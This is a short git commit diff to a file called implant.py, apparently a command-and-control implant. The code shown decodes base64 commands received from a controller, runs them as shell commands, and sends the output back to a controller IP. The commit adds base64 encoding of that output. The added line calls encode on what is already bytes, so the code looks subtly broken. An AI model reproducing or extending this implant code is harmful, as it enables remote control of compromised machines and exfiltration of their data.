f72012e11f3786aabd040fafac6e4667632d3208
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-13 17:04:32 -0400

    update

--- implant.py
+++ implant.py
@@ -29,6 +29,7 @@ class Implant(Host):
                 cmd = base64.b64decode(shellpack['data'].decode()).decode()
                 cmd = cmd.split(" ")
                 output = check_output(cmd, stderr=STDOUT, timeout=3)
+                output = base64.b64encode(output.encode())
                 
                 self.send(self.controller_ip, "instruction", "response", output)
             except TimeoutExpired:
